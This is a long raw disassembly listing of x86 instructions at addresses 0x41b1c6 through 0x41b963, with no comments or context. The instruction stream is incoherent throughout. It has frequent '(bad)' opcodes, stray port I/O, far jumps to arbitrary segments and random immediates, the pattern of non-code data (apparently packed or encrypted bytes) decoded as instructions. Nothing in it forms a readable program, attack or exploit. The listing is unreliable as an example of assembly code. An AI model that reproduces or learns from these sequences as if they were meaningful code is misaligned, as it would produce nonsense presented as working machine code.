  41b1c6:	sub    DWORD PTR [ebp+ebx*4-0x19],eax
  41b1ca:	js     0x41b153
  41b1cc:	mov    cl,BYTE PTR [esi+edi*2+0x35]
  41b1d0:	sub    DWORD PTR [esi+0x62dd77e3],esi
  41b1d6:	mov    eax,DWORD PTR [ecx]
  41b1d8:	(bad)  
  41b1da:	mov    DWORD PTR [ebp+0x7be740c2],edx
  41b1e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1e1:	mul    BYTE PTR [edi+0x9]
  41b1e4:	loopne 0x41b22b
  41b1e6:	cwde   
  41b1e7:	stc    
  41b1e8:	stc    
  41b1e9:	add    esp,0x782e00dc
  41b1ef:	sub    BYTE PTR [eax+0x40],ah
  41b1f2:	je     0x41b262
  41b1f4:	fist   WORD PTR [esi]
  41b1f6:	jmp    0x98b5:0xd316279a
  41b1fd:	inc    eax
  41b1fe:	cmp    eax,0xf5b7a0ea
  41b203:	xchg   ecx,eax
  41b204:	xchg   DWORD PTR [eax-0x3d],eax
  41b207:	mov    ebx,0x84d202d9
  41b20c:	lods   al,BYTE PTR ds:[esi]
  41b20d:	cmp    BYTE PTR [eax+0x45297360],bl
  41b213:	inc    edi
  41b214:	mov    al,ds:0xc87875b4
  41b219:	arpl   WORD PTR [eax],bx
  41b21b:	les    edx,FWORD PTR [eax-0x2e]
  41b21e:	inc    ebx
  41b21f:	repz add eax,0xdd83502c
  41b225:	sbb    DWORD PTR [edx],edx
  41b227:	fstp   QWORD PTR [edx-0x9]
  41b22a:	imul   esp,DWORD PTR [esi-0x7a87bc40],0xffffff9d
  41b231:	xchg   esp,eax
  41b232:	mov    es,ebx
  41b234:	lea    edx,gs:[ebx-0x28a322c0]
  41b23b:	dec    ebp
  41b23c:	(bad)  
  41b23d:	int    0xc1
  41b23f:	add    DWORD PTR [edx-0x1defc8a4],ecx
  41b245:	lea    ecx,[ebp+0x1edbbd48]
  41b24b:	push   edi
  41b24c:	rol    ah,0xa5
  41b24f:	cli    
  41b250:	repz dec ebx
  41b252:	ror    DWORD PTR [ecx+0x2c],1
  41b255:	push   es
  41b256:	test   bh,ah
  41b258:	gs inc eax
  41b25a:	or     BYTE PTR [edx],dh
  41b25c:	mov    edx,DWORD PTR [eax]
  41b25e:	mov    ebp,0x52794949
  41b264:	fidiv  WORD PTR ds:0xba5aaf00
  41b26a:	sub    al,0x20
  41b26c:	or     eax,0xaafd6dce
  41b271:	inc    eax
  41b272:	xor    edi,ebx
  41b274:	add    ebx,edx
  41b276:	imul   ebx,DWORD PTR [ecx+edx*2+0x4cfb9f28],0xadfe3d18
  41b281:	and    ecx,DWORD PTR [ebp+0x57]
  41b284:	fistp  DWORD PTR [esi-0x1e]
  41b287:	out    0x86,al
  41b289:	ret    
  41b28a:	dec    ebp
  41b28b:	(bad)  
  41b28e:	mov    eax,ds:0x39565e18
  41b293:	add    ebx,ebp
  41b295:	lods   al,BYTE PTR ds:[esi]
  41b296:	shl    DWORD PTR ds:0xa99aa34b,cl
  41b29c:	(bad)  
  41b29d:	pop    ebx
  41b29e:	test   DWORD PTR [esi-0x513f4f22],0x1c2237dd
  41b2a8:	xor    BYTE PTR [esi+ebx*2+0x640af60],0x66
  41b2b0:	jmp    0xaddc:0x74ab7bc6
  41b2b7:	pop    ss
  41b2b8:	and    DWORD PTR ds:0x5a85eb9b,ebx
  41b2be:	call   0x92f4afd7
  41b2c3:	das    
  41b2c4:	sub    BYTE PTR [eax],dl
  41b2c6:	add    eax,0xf550bd8e
  41b2cb:	std    
  41b2cc:	cld    
  41b2cd:	sub    al,0x98
  41b2cf:	repnz movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b2d2:	in     eax,dx
  41b2d3:	es icebp 
  41b2d5:	dec    esi
  41b2d6:	mov    ch,0x4c
  41b2d8:	es ins BYTE PTR es:[edi],dx
  41b2da:	jg     0x41b263
  41b2dc:	push   esp
  41b2dd:	sti    
  41b2de:	imul   ecx,DWORD PTR [ebx],0xffffffdd
  41b2e1:	popa   
  41b2e2:	mov    ecx,esi
  41b2e4:	inc    edi
  41b2e5:	sbb    ebx,DWORD PTR [ebp+edi*1-0xd5bfeb]
  41b2ec:	xchg   DWORD PTR [edx+0x4eac9fb1],ebx
  41b2f2:	cwde   
  41b2f3:	leave  
  41b2f4:	clc    
  41b2f5:	gs es stc 
  41b2f8:	jns    0x41b2a6
  41b2fa:	pop    edi
  41b2fb:	xor    al,0xf9
  41b2fd:	aas    
  41b2fe:	popf   
  41b2ff:	inc    ecx
  41b300:	test   DWORD PTR [ecx],esp
  41b302:	mov    es,WORD PTR [ebx+0x7b71d04]
  41b308:	call   0x68554acf
  41b30d:	mov    eax,ds:0xb7b7e466
  41b312:	sar    BYTE PTR [eax-0x3e682634],1
  41b318:	js     0x41b395
  41b31a:	or     DWORD PTR [ebx+0x39b3920c],0x8017d2c3
  41b324:	sti    
  41b325:	in     al,dx
  41b326:	jne    0x41b2c4
  41b328:	loop   0x41b369
  41b32a:	std    
  41b32b:	mov    cl,0xd0
  41b32d:	xor    eax,0x392800e6
  41b332:	cdq    
  41b333:	push   edi
  41b334:	lahf   
  41b335:	lea    eax,[ecx+0x6fde7ab4]
  41b33b:	es xchg edx,eax
  41b33d:	inc    ecx
  41b33e:	loopne 0x41b35c
  41b340:	ds fdiv st,st(7)
  41b343:	inc    ebx
  41b344:	data16 and al,0x68
  41b347:	je     0x41b326
  41b349:	ss fs jo 0x41b3bb
  41b34d:	outs   dx,DWORD PTR ds:[esi]
  41b34e:	mov    esi,0xc4b15ec5
  41b353:	in     eax,dx
  41b354:	js     0x41b375
  41b356:	mov    al,BYTE PTR [edi-0x3c6bf76e]
  41b35c:	ficom  WORD PTR [edx-0x55444d20]
  41b362:	ds std 
  41b364:	sbb    eax,0x724cf313
  41b369:	pop    edi
  41b36a:	test   eax,0x2a00971e
  41b36f:	fist   DWORD PTR [eax+0x33]
  41b372:	bound  ecx,QWORD PTR [ebx+0x10976859]
  41b378:	pop    edi
  41b379:	in     eax,dx
  41b37a:	push   0x7c
  41b37c:	cld    
  41b37d:	fisub  WORD PTR [ecx+edi*2]
  41b380:	pop    ebx
  41b381:	rol    DWORD PTR [esi+0x5dd2e587],1
  41b387:	aad    0xdd
  41b389:	outs   dx,DWORD PTR ds:[esi]
  41b38a:	aam    0x81
  41b38c:	test   al,dh
  41b38e:	xchg   esp,eax
  41b38f:	repnz inc edx
  41b391:	pop    edi
  41b392:	rcr    BYTE PTR [ebp-0x39],1
  41b395:	inc    eax
  41b396:	dec    ebp
  41b397:	mov    ecx,0x18095197
  41b39c:	fimul  WORD PTR [ebp+ebx*8-0xdf2a93b]
  41b3a3:	pop    ecx
  41b3a4:	fxch   st(1)
  41b3a6:	popf   
  41b3a7:	push   edi
  41b3a8:	push   ss
  41b3a9:	sub    al,0x14
  41b3ab:	xchg   ecx,eax
  41b3ac:	aam    0x40
  41b3ae:	je     0x41b3c2
  41b3b0:	add    al,0xac
  41b3b2:	scas   eax,DWORD PTR es:[edi]
  41b3b3:	pop    eax
  41b3b4:	(bad)  [edx]
  41b3b6:	repnz or eax,0xa5519230
  41b3bc:	int    0x40
  41b3be:	pop    esi
  41b3bf:	mov    edx,0x569fc4e9
  41b3c4:	dec    esi
  41b3c5:	push   0x97120c97
  41b3ca:	sahf   
  41b3cb:	xchg   esp,eax
  41b3cc:	adc    al,0xe2
  41b3ce:	pop    edx
  41b3cf:	cs push 0x9486e34b
  41b3d5:	xor    DWORD PTR [eax+0x2af91872],edx
  41b3db:	push   es
  41b3dc:	dec    esi
  41b3dd:	pop    esi
  41b3de:	jbe    0x41b367
  41b3e0:	cmp    BYTE PTR [edx],ch
  41b3e2:	arpl   bx,si
  41b3e4:	jle    0x41b36b
  41b3e6:	mov    eax,ds:0xb9d5faac
  41b3eb:	xchg   BYTE PTR [eax-0x593a68b8],bh
  41b3f1:	inc    ecx
  41b3f2:	imul   esi,DWORD PTR [esi+0x274c2b15],0xa579618b
  41b3fc:	ds mov edx,0xd06b469d
  41b402:	xchg   edi,eax
  41b403:	cs je  0x41b3b5
  41b406:	or     eax,0x8f3fb18f
  41b40b:	ret    0x70bd
  41b40e:	push   ds
  41b40f:	jno    0x41b442
  41b411:	cmp    edi,eax
  41b413:	sub    al,0xdd
  41b415:	push   cs
  41b416:	mov    ebx,0x60ece05
  41b41b:	mov    dl,0x44
  41b41d:	inc    eax
  41b41e:	das    
  41b41f:	inc    esp
  41b420:	or     esi,DWORD PTR [ecx-0x3d]
  41b423:	lock xor dh,BYTE PTR [edx+ecx*1+0x1812ddd2]
  41b42b:	adc    eax,DWORD PTR [ebx-0x185a91f7]
  41b431:	aas    
  41b432:	xchg   ebp,eax
  41b433:	jle    0x41b474
  41b435:	and    eax,0xc1883bb0
  41b43a:	sahf   
  41b43b:	dec    esi
  41b43c:	and    BYTE PTR [edx+0x44],al
  41b43f:	retf   
  41b440:	jge    0x41b4b6
  41b442:	xchg   DWORD PTR [edi-0x6fa5b8a8],esi
  41b448:	push   esi
  41b449:	in     al,dx
  41b44a:	mov    dh,0xd3
  41b44c:	mov    bh,0xd6
  41b44e:	sahf   
  41b44f:	data16 jmp 0x41b3f9
  41b452:	imul   ebp,eax,0xa12b804e
  41b458:	mov    ch,0x75
  41b45a:	(bad)  [eax-0x822bf60]
  41b460:	xchg   edi,eax
  41b461:	mov    dl,0xe
  41b463:	xor    DWORD PTR [edx-0x475a67d2],ebp
  41b469:	cmp    ah,bh
  41b46b:	arpl   WORD PTR [ebx],di
  41b46d:	xor    eax,0x30fd0810
  41b472:	xor    DWORD PTR [edi-0x7c7e373],eax
  41b478:	dec    esi
  41b479:	inc    ebx
  41b47a:	xchg   edi,eax
  41b47b:	int    0xff
  41b47d:	test   al,0x85
  41b47f:	add    esi,esp
  41b481:	into   
  41b482:	aad    0x1e
  41b484:	cli    
  41b485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b486:	call   0x532f6e11
  41b48b:	pusha  
  41b48c:	cmp    eax,0x55f77fea
  41b491:	das    
  41b492:	or     eax,0x76416961
  41b497:	ja     0x41b4ad
  41b499:	cmp    eax,0xc48aebe
  41b49e:	sub    eax,0x888f168b
  41b4a3:	mov    BYTE PTR ds:0x578773c2,dh
  41b4a9:	rol    al,0x9c
  41b4ac:	je     0x41b4cc
  41b4ae:	xchg   ebp,eax
  41b4af:	xchg   esi,esp
  41b4b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4b2:	cwde   
  41b4b3:	jnp    0x41b493
  41b4b5:	fisub  DWORD PTR [edx]
  41b4b7:	repnz and DWORD PTR [edx-0x6e412557],eax
  41b4be:	xchg   DWORD PTR [edi+0x2b46415f],edx
  41b4c4:	pushf  
  41b4c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4c6:	xchg   ebp,eax
  41b4c7:	enter  0x1be2,0x18
  41b4cb:	sbb    ch,0x2
  41b4ce:	sbb    ebx,ecx
  41b4d0:	repz std 
  41b4d2:	retf   
  41b4d3:	jno    0x41b4c2
  41b4d5:	daa    
  41b4d6:	lods   al,BYTE PTR ds:[esi]
  41b4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d8:	jl     0x41b526
  41b4da:	aaa    
  41b4db:	xchg   DWORD PTR [edx-0x1c],ebx
  41b4de:	sbb    eax,0xbf8add84
  41b4e3:	scas   eax,DWORD PTR es:[edi]
  41b4e4:	cwde   
  41b4e5:	xchg   ah,al
  41b4e7:	loop   0x41b4b5
  41b4e9:	inc    eax
  41b4ea:	mov    ecx,0xd284ace8
  41b4ef:	repz pop ss
  41b4f1:	inc    edi
  41b4f2:	inc    edi
  41b4f3:	adc    al,0xdd
  41b4f5:	xchg   esi,eax
  41b4f6:	rol    BYTE PTR ss:[esi+0x2a],0x3f
  41b4fb:	(bad)  
  41b4fc:	aam    0x4f
  41b4fe:	pop    ebp
  41b4ff:	test   al,0x71
  41b501:	test   edi,edx
  41b503:	lods   eax,DWORD PTR ds:[esi]
  41b504:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b506:	xor    ax,0xe3cd
  41b50a:	xchg   edi,eax
  41b50b:	push   es
  41b50c:	leave  
  41b50d:	push   ebp
  41b50e:	int    0x3e
  41b510:	in     al,0x4d
  41b512:	push   ss
  41b513:	xlat   BYTE PTR ds:[ebx]
  41b514:	sbb    BYTE PTR [esi-0x37226fd7],ah
  41b51a:	add    al,dl
  41b51c:	pop    ecx
  41b51d:	jg     0x41b4b9
  41b51f:	dec    edi
  41b520:	add    DWORD PTR [ebx],esi
  41b522:	sub    eax,0x23405102
  41b527:	push   ebx
  41b528:	mov    ebx,0xde756f5e
  41b52d:	inc    esi
  41b52e:	xchg   ebx,eax
  41b52f:	adc    ebp,ebx
  41b531:	popf   
  41b532:	jo     0x41b5a1
  41b534:	pop    edx
  41b535:	dec    DWORD PTR [esp+esi*1+0x5e5b4023]
  41b53c:	cmp    DWORD PTR [ebp-0x20816fc5],ecx
  41b542:	xchg   edi,eax
  41b543:	jmp    0x6584c0cc
  41b548:	lahf   
  41b549:	fiadd  DWORD PTR [eax]
  41b54b:	ret    
  41b54c:	jns    0x41b4de
  41b54e:	xchg   ebp,eax
  41b54f:	mov    ds:0x87551143,eax
  41b554:	stc    
  41b555:	cmp    bl,BYTE PTR [eax+0x6964578f]
  41b55b:	ds jle 0x41b578
  41b55e:	pop    edi
  41b55f:	(bad)  
  41b560:	enter  0xf7b9,0x86
  41b564:	sub    al,bl
  41b566:	popf   
  41b567:	test   esi,ebx
  41b569:	push   ss
  41b56a:	adc    DWORD PTR [edx],0xa0a837c
  41b570:	popf   
  41b571:	push   ss
  41b572:	mov    ah,BYTE PTR [esi+ebx*2-0xd]
  41b576:	add    al,BYTE PTR [edi+0x4b0fffe2]
  41b57c:	or     eax,0xa542bdf2
  41b581:	js     0x41b5d4
  41b583:	mov    ebp,0x8704cd13
  41b588:	push   eax
  41b589:	(bad)  
  41b58a:	ja     0x41b5ab
  41b58c:	stc    
  41b58d:	mov    ecx,0x4341b968
  41b592:	xchg   edi,eax
  41b593:	dec    eax
  41b594:	add    edx,DWORD PTR [edi]
  41b596:	ret    
  41b597:	fs inc ebx
  41b599:	mov    ah,0xb8
  41b59b:	repnz leave 
  41b59d:	fld    DWORD PTR [esi+0x15517301]
  41b5a4:	frstor [esi+0x5ae8eb75]
  41b5aa:	pop    edx
  41b5ab:	push   ds
  41b5ac:	xlat   BYTE PTR ds:[ebx]
  41b5ad:	inc    eax
  41b5ae:	push   DWORD PTR [ebp-0x2221db1]
  41b5b4:	into   
  41b5b5:	lock xchg edi,eax
  41b5b7:	xchg   esp,eax
  41b5b8:	cmp    bh,BYTE PTR [esp+ebp*4+0x79c828ad]
  41b5bf:	adc    al,0xd8
  41b5c1:	pop    ebp
  41b5c2:	xor    eax,0xa679f487
  41b5c7:	mov    esi,0xc83a7fdd
  41b5cc:	sub    eax,DWORD PTR [ecx-0x48]
  41b5cf:	jg     0x41b56f
  41b5d1:	mov    ah,0x9
  41b5d3:	xchg   edx,eax
  41b5d4:	mov    bh,0x5a
  41b5d6:	or     al,0x87
  41b5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5d9:	adc    DWORD PTR [ebp+0x68],0x76f18beb
  41b5e0:	cmp    esp,DWORD PTR [eax+0x4ae55a38]
  41b5e6:	(bad)  
  41b5e8:	and    al,BYTE PTR [eax+0x3c]
  41b5eb:	outs   dx,DWORD PTR ds:[esi]
  41b5ec:	mov    ebx,0x66b987b7
  41b5f1:	shl    DWORD PTR [ebp+0x1207ead5],cl
  41b5f7:	push   cs
  41b5f8:	sbb    bh,al
  41b5fa:	xchg   DWORD PTR cs:[eax+0x37],ecx
  41b5fe:	inc    edx
  41b5ff:	stos   DWORD PTR es:[edi],eax
  41b600:	inc    edi
  41b601:	dec    ebx
  41b602:	xlat   BYTE PTR ds:[ebx]
  41b603:	xchg   BYTE PTR [ebp-0x228ea627],al
  41b609:	mov    ds:0xfbc2b196,eax
  41b60e:	mov    bh,0xcc
  41b610:	stc    
  41b611:	jnp    0x41b650
  41b613:	xor    eax,0xa4d691dd
  41b618:	pop    esp
  41b619:	fsubp  st(3),st
  41b61b:	push   ds
  41b61c:	(bad)  
  41b61e:	sbb    ebx,eax
  41b620:	cmp    eax,DWORD PTR [edi+0x40b2b2ca]
  41b626:	inc    ebp
  41b627:	ds out dx,eax
  41b629:	dec    al
  41b62b:	shl    BYTE PTR [edi+0x230f9802],1
  41b631:	xor    al,0x1
  41b633:	jp     0x41b5fb
  41b635:	pop    ebp
  41b636:	xor    ebp,DWORD PTR [edi-0x791e052e]
  41b63c:	mov    ?,WORD PTR [edi+0x60dd687c]
  41b642:	addr16 push esi
  41b644:	mov    ebp,0xb0d52f11
  41b649:	inc    eax
  41b64a:	call   0xe781:0x4d22d9fe
  41b651:	aaa    
  41b652:	jle    0x41b5d9
  41b654:	fisttp QWORD PTR [ecx+esi*2]
  41b657:	xor    al,0x20
  41b659:	push   eax
  41b65a:	out    dx,eax
  41b65b:	push   edx
  41b65c:	and    dh,BYTE PTR [edx]
  41b65e:	xor    al,BYTE PTR [edi-0x72]
  41b661:	int    0x9c
  41b663:	xchg   ebp,eax
  41b664:	in     al,0x58
  41b666:	jg     0x41b65e
  41b668:	xchg   edx,eax
  41b669:	cli    
  41b66a:	mov    dh,0xc6
  41b66c:	in     al,dx
  41b66d:	and    eax,0xc0dcfaf2
  41b672:	xchg   dh,dl
  41b674:	mov    BYTE PTR [edx+0x4c9a1ae9],bh
  41b67a:	pop    ebp
  41b67b:	xchg   DWORD PTR [ebx],ebx
  41b67d:	sub    DWORD PTR [ebp-0x1],edi
  41b680:	jne    0x41b6c6
  41b682:	xchg   edi,eax
  41b683:	repnz mov eax,ds:0x50d9c213
  41b689:	mov    ebx,0xccda62dd
  41b68e:	cmp    DWORD PTR [eax+0x57],0x40
  41b692:	xchg   bl,ch
  41b694:	gs sbb eax,0x94df08f3
  41b69a:	pushf  
  41b69b:	xor    DWORD PTR [ecx],0x26
  41b69e:	test   DWORD PTR [ebx+0x6b3a14a0],esi
  41b6a4:	ins    DWORD PTR es:[edi],dx
  41b6a5:	(bad)  
  41b6a6:	sbb    esp,DWORD PTR [edi+0x2a]
  41b6a9:	cmp    dh,bh
  41b6ab:	xchg   BYTE PTR [edi],cl
  41b6ad:	scas   eax,DWORD PTR es:[edi]
  41b6ae:	xor    al,0x25
  41b6b0:	repz lea esp,[edx+edi*1]
  41b6b4:	xchg   ebp,eax
  41b6b5:	jp     0x41b64e
  41b6b7:	fadd   DWORD PTR ds:[edx]
  41b6ba:	or     ebx,DWORD PTR [ebx+0x61]
  41b6bd:	pop    eax
  41b6be:	xchg   edi,eax
  41b6bf:	lock je 0x41b71d
  41b6c2:	mul    BYTE PTR [edi+0x7c]
  41b6c5:	jne    0x41b6ca
  41b6c7:	mov    bh,0xef
  41b6c9:	lahf   
  41b6ca:	outs   dx,DWORD PTR ds:[esi]
  41b6cb:	xchg   DWORD PTR [edx-0x22bac812],eax
  41b6d1:	repz push ds
  41b6d3:	adc    dl,al
  41b6d5:	jb     0x41b6d1
  41b6d7:	dec    DWORD PTR [edx]
  41b6d9:	inc    eax
  41b6da:	adc    DWORD PTR [edx+edi*8+0x6d44823e],edi
  41b6e1:	or     al,0x98
  41b6e3:	ss cld 
  41b6e5:	rcr    al,1
  41b6e7:	(bad)  
  41b6e8:	shl    DWORD PTR [eax-0x26f80b21],cl
  41b6ee:	add    BYTE PTR [edi-0x7fd7df49],0xdd
  41b6f5:	mov    bh,0x17
  41b6f7:	inc    esi
  41b6f8:	dec    edx
  41b6f9:	daa    
  41b6fa:	push   es
  41b6fb:	cmp    ecx,DWORD PTR [esi+0x24]
  41b6fe:	and    ch,BYTE PTR [edx-0x788ad34b]
  41b704:	inc    edi
  41b705:	add    eax,ebp
  41b707:	out    0xdd,al
  41b709:	mov    ebx,0xbfce2fe1
  41b70e:	dec    edx
  41b70f:	out    0xa3,al
  41b711:	inc    eax
  41b712:	push   eax
  41b713:	imul   edi,DWORD PTR [esi-0x32],0xffffffdf
  41b717:	add    DWORD PTR [edi],ecx
  41b719:	aam    0x97
  41b71b:	leave  
  41b71c:	dec    ebx
  41b71d:	aas    
  41b71e:	adc    al,0x29
  41b720:	in     al,0xa6
  41b722:	fsub   DWORD PTR [eax+0x67f405e]
  41b728:	stc    
  41b729:	cmp    eax,0x1d5afefd
  41b72e:	cwde   
  41b72f:	stc    
  41b730:	in     al,dx
  41b731:	scas   al,BYTE PTR es:[edi]
  41b732:	push   0xffffffbf
  41b734:	dec    esi
  41b735:	test   eax,0x33eada99
  41b73a:	push   ecx
  41b73b:	xchg   ecx,eax
  41b73c:	rol    BYTE PTR [eax+0x36],0x0
  41b740:	pop    edx
  41b741:	arpl   WORD PTR [edx+0x22fedd9f],sp
  41b747:	mov    esi,0x9ecb6890
  41b74c:	repz xor ebx,ecx
  41b74f:	leave  
  41b750:	sub    al,0x36
  41b752:	adc    al,BYTE PTR ds:0x8773f146
  41b758:	adc    eax,0xdd6f7822
  41b75d:	loop   0x41b7d0
  41b75f:	add    eax,0x2c510b01
  41b764:	push   edx
  41b765:	clc    
  41b766:	ror    BYTE PTR [ebx],cl
  41b768:	sbb    BYTE PTR [edx],dl
  41b76a:	stc    
  41b76b:	xchg   BYTE PTR [edx+eax*1],cl
  41b76e:	xor    edi,DWORD PTR [edi]
  41b770:	(bad)  
  41b772:	ins    BYTE PTR es:[edi],dx
  41b773:	push   ss
  41b774:	adc    al,cl
  41b776:	sub    BYTE PTR [ebp+0x48],bh
  41b779:	inc    eax
  41b77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b77b:	imul   ebp,DWORD PTR [ebx+0x6235e82d],0xe3f797ad
  41b785:	cwde   
  41b786:	icebp  
  41b787:	out    dx,eax
  41b788:	cmp    eax,0x2ca6b1bb
  41b78d:	push   cs
  41b78e:	cwde   
  41b78f:	fsubp  st(4),st
  41b791:	ds call 0x6d27:0x99279c76
  41b799:	push   cs
  41b79a:	mov    eax,0x77878d60
  41b79f:	inc    ecx
  41b7a0:	add    DWORD PTR [eax-0x62],0xc5fc492f
  41b7a7:	les    edi,FWORD PTR [ecx+0xc]
  41b7aa:	mov    BYTE PTR [edi-0x1c],ch
  41b7ad:	dec    edi
  41b7ae:	pop    edi
  41b7af:	in     al,dx
  41b7b0:	mov    al,ds:0x7840d7ee
  41b7b5:	scas   eax,DWORD PTR es:[edi]
  41b7b6:	mov    edi,0x7d1ae90d
  41b7bb:	xchg   DWORD PTR [eax],eax
  41b7bd:	push   edx
  41b7be:	adc    ch,BYTE PTR [edx-0x23]
  41b7c1:	popf   
  41b7c2:	mov    al,ds:0x9d141ce1
  41b7c7:	stos   DWORD PTR es:[edi],eax
  41b7c8:	hlt    
  41b7c9:	xchg   DWORD PTR [esi],ebp
  41b7cb:	(bad)  
  41b7cd:	rdpmc  
  41b7cf:	jge    0x41b819
  41b7d1:	pop    ds
  41b7d2:	inc    ecx
  41b7d3:	mov    edx,0x9ec45de4
  41b7d8:	cmp    eax,0x7ea167a3
  41b7dd:	push   ds
  41b7de:	sbb    eax,0xda66785a
  41b7e3:	xchg   BYTE PTR [ebp-0x2f],bl
  41b7e6:	pop    ebx
  41b7e7:	dec    eax
  41b7e8:	fst    st(5)
  41b7ea:	mov    bl,dh
  41b7ec:	das    
  41b7ed:	pop    ss
  41b7ee:	shl    DWORD PTR [edi+0x66fabef4],cl
  41b7f4:	adc    DWORD PTR [edx+0x54c1a3c1],edi
  41b7fa:	lahf   
  41b7fb:	push   es
  41b7fc:	push   esp
  41b7fd:	mov    ecx,0x118ac0b
  41b802:	outs   dx,DWORD PTR ds:[esi]
  41b803:	pushf  
  41b804:	fbstp  TBYTE PTR [edi-0x45]
  41b807:	lds    ebp,FWORD PTR [edx-0x16]
  41b80a:	aas    
  41b80b:	pop    es
  41b80c:	push   ebx
  41b80d:	cli    
  41b80e:	loopne 0x41b7e2
  41b810:	bound  ebp,QWORD PTR [ecx+esi*2]
  41b813:	lahf   
  41b814:	pop    ebp
  41b815:	push   ds
  41b816:	test   BYTE PTR [edi],dh
  41b818:	fld    QWORD PTR [eax]
  41b81a:	int    0x10
  41b81c:	inc    DWORD PTR [edi+0x43fd8afa]
  41b822:	daa    
  41b823:	xor    bl,bl
  41b825:	fcmovnb st,st(2)
  41b827:	adc    DWORD PTR [edi],esp
  41b829:	in     al,dx
  41b82a:	aam    0x6
  41b82c:	fisttp QWORD PTR [edi-0x9ff2ff1]
  41b832:	xchg   esi,eax
  41b833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b834:	push   ss
  41b835:	inc    edx
  41b836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b837:	mov    esi,0x97005cd5
  41b83c:	cmp    eax,0xddb315d0
  41b841:	mov    BYTE PTR [ecx],dh
  41b843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b844:	lahf   
  41b845:	pop    ds
  41b846:	fisub  WORD PTR ds:0xc6363aba
  41b84c:	jmp    0x41b892
  41b84e:	jmp    0x41b7d6
  41b850:	lods   eax,DWORD PTR ds:[esi]
  41b851:	mov    ebp,0x5cddf492
  41b856:	xchg   ebp,eax
  41b857:	xor    BYTE PTR [di],0xad
  41b85b:	dec    edx
  41b85c:	push   edi
  41b85d:	pop    edi
  41b85e:	sbb    ah,BYTE PTR [edi]
  41b860:	adc    eax,0x62a50a9c
  41b865:	mov    ds:0x4cfc78d,al
  41b86a:	cwde   
  41b86b:	fimul  DWORD PTR [ebx-0x49dfdf87]
  41b871:	ror    BYTE PTR [edi],1
  41b873:	dec    eax
  41b874:	sbb    BYTE PTR [ebx+0x271e877a],bh
  41b87a:	ret    0xdd24
  41b87d:	test   BYTE PTR [edi],ch
  41b87f:	mov    eax,ds:0x5bf50889
  41b884:	daa    
  41b885:	inc    eax
  41b886:	jo     0x41b904
  41b888:	jno    0x41b8c2
  41b88a:	jo     0x41b8cd
  41b88c:	and    ah,bl
  41b88e:	xchg   edi,eax
  41b88f:	cwde   
  41b890:	loop   0x41b887
  41b892:	mov    edx,0xda3d5f16
  41b897:	sbb    DWORD PTR [ecx+0x2b],ebx
  41b89a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b89b:	xchg   BYTE PTR [ebp-0x22b92e61],al
  41b8a1:	dec    esi
  41b8a2:	inc    edi
  41b8a3:	outs   dx,BYTE PTR ds:[esi]
  41b8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8a5:	dec    ebx
  41b8a6:	das    
  41b8a7:	mov    ecx,0xf1ad4f74
  41b8ac:	loopne 0x41b891
  41b8ae:	ja     0x41b86a
  41b8b0:	jo     0x41b91f
  41b8b2:	inc    ecx
  41b8b3:	push   eax
  41b8b4:	fstp   QWORD PTR [ebx+0x3f25ab01]
  41b8ba:	int    0x2f
  41b8bc:	jns    0x41b91d
  41b8be:	add    ah,BYTE PTR [esi+0x3bf76fe7]
  41b8c4:	ins    BYTE PTR es:[edi],dx
  41b8c5:	push   0x22a2a097
  41b8ca:	xchg   ebp,eax
  41b8cb:	mov    WORD PTR gs:[ebp-0x5a],gs
  41b8cf:	jmp    0x87164bc7
  41b8d4:	jmp    0x8398:0xfa576401
  41b8db:	stos   DWORD PTR es:[edi],eax
  41b8dc:	adc    eax,0x45dde940
  41b8e1:	stos   BYTE PTR es:[edi],al
  41b8e2:	outs   dx,DWORD PTR ds:[esi]
  41b8e3:	ror    DWORD PTR [edi+edi*4],cl
  41b8e6:	fwait
  41b8e7:	cmp    dh,bl
  41b8e9:	(bad)  
  41b8ea:	ffreep st(2)
  41b8ec:	fnsave [ebx+0x7142be58]
  41b8f2:	adc    BYTE PTR [ecx],0xeb
  41b8f5:	aad    0xe3
  41b8f7:	xor    al,0xa8
  41b8f9:	loopne 0x41b8c6
  41b8fb:	inc    esi
  41b8fc:	ins    DWORD PTR es:[edi],dx
  41b8fd:	adc    DWORD PTR [edx-0x23],edx
  41b900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b901:	inc    edi
  41b902:	add    al,0xfc
  41b904:	add    ecx,esp
  41b906:	and    DWORD PTR [edx],ecx
  41b908:	lock mov bl,0x78
  41b90b:	test   DWORD PTR [esi-0x7d],0x2b8f41a0
  41b912:	push   cs
  41b913:	sbb    al,0xf7
  41b915:	(bad)  
  41b916:	mov    bh,0x6
  41b918:	jecxz  0x41b959
  41b91a:	inc    ebp
  41b91b:	je     0x41b908
  41b91d:	(bad)  
  41b91f:	xor    al,dl
  41b921:	add    eax,0xde37e198
  41b926:	pop    ebx
  41b927:	inc    eax
  41b928:	fdiv   DWORD PTR [edi]
  41b92a:	mov    ebx,0x51ceff50
  41b92f:	rcr    BYTE PTR [ecx-0x128de83e],0x31
  41b936:	pop    esi
  41b937:	test   DWORD PTR [edx+eax*4],ebp
  41b93a:	xchg   edi,eax
  41b93b:	mov    edi,0x1a623a49
  41b940:	in     eax,0x45
  41b942:	pop    ds
  41b943:	test   BYTE PTR ds:0x9e8e6fda,cl
  41b949:	ja     0x41b9b9
  41b94b:	or     esi,esi
  41b94d:	clc    
  41b94e:	fidiv  DWORD PTR [esi]
  41b950:	out    dx,eax
  41b951:	sbb    DWORD PTR [edx-0x6cae2255],esp
  41b957:	xchg   esi,eax
  41b958:	pop    esp
  41b959:	mov    ah,0xcb
  41b95b:	add    al,0x1d
  41b95d:	jg     0x41b9c4
  41b95f:	mov    al,bl
  41b961:	xor    edx,DWORD PTR [ebx]
  41b963:	icebp  
